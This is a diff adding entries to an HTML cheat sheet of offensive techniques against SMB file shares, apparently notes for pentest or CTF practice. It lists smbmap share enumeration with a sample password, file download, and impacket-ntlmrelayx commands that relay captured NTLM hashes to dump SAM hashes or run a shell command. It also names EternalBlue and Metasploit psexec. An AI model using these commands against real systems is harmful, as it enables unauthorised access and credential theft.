@@ -21,12 +21,19 @@
         <div class="notion-header">
             <h1>Samba (TCP/445)</h1>
             <p>Software dedicated to share files</p>
+            
         </div>
         <div class="notion-body">
+            <b>When there is in place a SMB server it's hihghly recommended to run the commands found in the NTLM section. (Responder, inveigh...)</b>
             <h2>Usage</h2>
             <ul>
                 <h3>Connect to share</h3>
                 <pre><code class="language-bash">smbclient //VICTIM_IP/NAME_OF_SHARE </code></pre>
+                <p>A very intersting alternative is smbmap which allow us to view which share are we able to write with the user we are trying. Here are some exameples</p>
+                <pre><code class="language-bash">smbmap -H 10.129.9.11 #connect with null session
+smbmap  -u jason -p '34c8zuNBo91!@28Bszh' # connect with username and password
+smbmap -H 10.129.9.11 -r notes # View content from notes share
+smbmap -H 10.129.9.11 -r notes --download "notes\file.txt" #Download file.txt from notes share</code></pre>    
 
                 <h3>List shares windows</h3>
                 <pre><code class="language-bash">net view \\IP</code></pre>
@@ -117,6 +124,16 @@ domain=.</code></pre>
                     <p>CVE-2025-24071</p>
                 </ul>
 
+                <h3>Smbrelay</h3>
+                <ul>
+                    <p>In case you captured a NTLMv2 hash and you are not able to crack it. You should try to relay the authentication to another server.</p>    
+                    <p>This way you'll be able to authenticate to the server in case you are allowed and dump SAM hashses</p>
+                    <pre><code class="language-bash">impacket-ntlmrelayx --no-http-server -smb2support -t 10.10.110.146</code></pre>
+                    <p>We can also create a reverse shell</p>
+                    <pre><code class="language-bash">impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.220.146 -c 'command'</code></pre>
+                    
+                </ul>
+
                 <h3>EternalBlue</h3>
                 <ul>
                     <p>SMB1 is vulnerable to a common vulnerability called Eternal Blue this one allows to inject code in SMB and spawn a shell as NT Authority\Systen</p>
@@ -147,11 +164,13 @@ stream: [:Password:$DATA], 15 bytes</code></pre>
                    <p>As you can see there is a data stream called <b>Password</b> we can view its content using the command <b>more</b> over the file</p>
                 </ul>
 
-                <h3>psexec using admin credentials</h3>
+                <h3>Psexec using admin credentials</h3>
                 <ul>
                     <p>In case you have admin credentials of a computer you may be able to use the following metasploit module which grants access to the server</p>
                     <pre><code class="language-bash">exploit/windows/smb/psexec</code></pre>
                 </ul>
+
+                
             </ul>
         </div>
     </div>
